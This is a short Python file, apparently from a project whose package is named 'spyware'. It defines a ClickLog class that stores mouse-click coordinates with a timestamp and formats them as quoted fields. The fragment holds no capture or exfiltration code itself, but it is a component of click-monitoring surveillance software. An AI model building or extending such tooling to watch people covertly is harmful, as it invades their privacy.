from spyware.logs.log import Log

class ClickLog(Log):
    def __init__(self, x: int, y: int) -> None:
        super().__init__()

        self.x = x
        self.y = y

    def __repr__(self) -> str:
        return f"'{ self.x }'," + \
            f"'{ self.y }'," + \
            f"'{ self.day }'," + \
            f"'{ self.month }'," + \
            f"'{ self.year }'," + \
            f"'{ self.hour }'," + \
            f"'{ self.minute }'," + \
            f"'{ self.second }'"